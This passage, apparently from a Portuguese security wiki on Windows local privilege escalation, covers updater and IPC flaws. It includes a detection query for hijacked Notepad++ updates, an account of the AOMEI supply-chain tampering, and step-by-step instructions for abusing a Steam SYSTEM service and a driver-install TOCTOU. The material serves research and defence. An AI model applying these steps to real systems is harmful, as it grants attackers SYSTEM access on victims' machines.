| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Esses padrões se generalizam a qualquer updater que aceite manifests não assinados ou não fixe os signatários do instalador: sequestro de rede + instalador malicioso + sideloading assinado pelo atacante resultam em remote code execution sob o pretexto de atualizações “confiáveis”.

### Configuração de notificações como segundo gatilho de atualização

Um updater pode usar configurações remotas separadas para **preparar conteúdo e acionar sua execução**. Isso exige controle das configurações ou das respostas; os relatos não identificam como o acesso à origem foi obtido. No caso da AOMEI, `down_html.ini` selecionava uma URL de archive, uma versão (`thrid`) e um MD5 (`Val`); o atacante aumentou a versão e alterou a URL e o checksum correspondente. Esta é a [falha no limite de confiança dos metadados](#2-hijacking-the-update-channel-to-run-code-as-system) abordada acima. O caminho de execução adicional era `Notifycfg.ini`: ele instruía `ABNotify.exe` a carregar um `upgrade-now.html` extraído por meio de uma URL local `file:///` em um WebView. A página navegava automaticamente até um executável no mesmo diretório, que o WebView entregava ao shell do sistema. O processo filho herdava os privilégios do notificador; isso não o elevava inerentemente a SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

O Google também relatou um `Notifycfg.ini` adulterado com mais de 35.000 seções dummy repetidas, que contornou a verificação normal de versão desse cliente. O relato não demonstra um bypass geral do parser. O atacante restaurava os arquivos remotos após janelas de cinco a dez minutos, então apenas os clientes que consultavam o servidor durante essas janelas recebiam a configuração alterada. Esse canal de notificação também continha uma isca distinta de [coerção WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), que não exigia a execução do archive.<sup>[[18]](#references)</sup>

---
## Bootstrap de memória compartilhada para IPC de serviço privilegiado

Não pare na enumeração de named pipes. Um broker SYSTEM pode expor um **file mapping** permissivo para configurar a conexão e, em seguida, duplicar handles de anonymous pipes no processo solicitante. No design da Steam testado, `Global\SteamClientService_SharedMemFile` e `Global\SteamClientService_SharedMemLock` coordenam o handshake de PID/evento do cliente; o serviço retorna dois handles de pipe, e as solicitações subsequentes, prefixadas por comprimento, usam `RunInterface` (`0x01`). A DACL do mapping permitia clientes de qualquer nível de integridade. O objeto interno `CSteamServiceWin32` em `steamclient64.dll` fornecia um cliente prático: resolver a global específica da build, chamar o slot 0 da vtable, `Connect`, e então usar os mapas de interface em vez de reimplementar o handshake. Acessar o IPC é apenas um pré-requisito; a decisão de confiança do handler privilegiado determina se há escalada. <sup>[[19]](#references)[[20]](#references)</sup>

### Manifest assinado expande-se para uma allowlist de executáveis obsoleta

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) verifica o `kvsignatures` de um VDF assinado, mas registra o **caminho expandido do executável**, não uma identidade imutável do arquivo. Com uma entrada assinada `Run Process`, como `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, forneça um `%INSTALLDIR%` gravável pelo usuário. Coloque um executável substituto nesse caminho expandido exato e, em seguida, chame `RunInstallScript` (slot 22) com um VDF não assinado cujo `Process 1` indique o caminho permitido. A entrada permanece após a execução do script assinado até a reinicialização do serviço; na implementação relatada, não há revalidação do arquivo antes da execução como SYSTEM. Use o nome de arquivo preparado correspondente à entrada assinada real, não apenas à categoria de pré-requisito. <sup>[[19]](#references)[[20]](#references)</sup>

### Processo filho do gerenciador de módulos contorna a verificação de assinatura do carregamento direto

`IClientModuleManager::LoadModule` (slot 0) aceita bytes de módulo quando o ID fornecido corresponde ao CRC32 deles. `CallFunctionAsync` (slot 3) com `flags & 8` seleciona um ramo de **processo filho**, em vez do ramo de carregamento reflexivo direto, que verifica uma assinatura da Valve. O serviço grava `legacycompat\servicecall_<CRC>.dll` e inicia `legacycompat\steamservice.exe /runfunc ...` a partir do diretório de instalação. Se esse diretório for gravável pelo usuário, coloque um executável no último caminho, carregue qualquer módulo descartável com CRC correspondente e chame o método assíncrono com o bit 3 definido. Na build relatada, o executável filho e a DLL gravada em disco não eram autenticados. O módulo não precisa ser um payload funcional: é o executável filho substituído que é executado como SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Verificações de membro do catálogo antes da instalação de driver privilegiada

Para um broker de instalação de drivers, verifique se a validação do catálogo está vinculada ao **INF exato passado ao instalador**. No caminho relatado de `InstallVrLinkDongleDriver`, `WinVerifyTrust` valida um catálogo e `CryptCATAdminCalcHashFromFileHandle` procura *pelo menos um* arquivo correspondente em um diretório fornecido pelo solicitante, mas o serviço executa `pnputil /add-driver ... /install` em `netrtwlanuval.inf` sem estabelecer que esse INF seja o membro pretendido do catálogo. Um diretório simples ou específico da arquitetura é aceito. Portanto, um catálogo assinado com qualquer membro correspondente no diretório pode passar pela verificação fraca do serviço, mesmo que o INF enviado ao instalador privilegiado seja diferente. Não presuma que isso, por si só, contorna a política de assinatura de drivers do Windows: a instalação bem-sucedida ainda depende do pacote substituto e da política do host. <sup>[[19]](#references)[[20]](#references)</sup>

O serviço libera seus handles de validação antes de `pnputil` abrir o INF, criando uma [lacuna TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) com um destino de instalação de driver, em vez de uma atualização de executável. Um oplock pode sincronizar uma substituição entre a verificação e a abertura pelo instalador. O mesmo IPC expõe [encaminhamento de entrada na área de trabalho segura](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring), mediante pré-requisitos de consentimento separados. <sup>[[19]](#references)</sup>

## References
- [1] [Aviso – Netskope Client para Windows – Escalada de privilégios local via servidor rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Aviso de segurança NSKPSA-2025-002 da Netskope](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin da Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – cliente/exploit IPC da Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Invadindo ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalada de privilégios local via arquivos graváveis no Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalada de privilégios no agente Windows](https://checkmk.com/werk/16361)
- [10] [PoCs de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer da CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Atores de Estado-nação exploram a cadeia de suprimentos do Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – atualização do incidente de sequestro da infraestrutura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contornando a correção da CVE-2025-0309 no Netskope Client para Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Descobrindo falhas de escalada de privilégios no Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: de gRPC a SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Comprometimento da cadeia de suprimentos do AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group e Mandiant – Investigando adulterações efêmeras na cadeia de suprimentos](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Virando a Valve do avesso](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [PoCs de Atredis – Virando a Valve do avesso](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
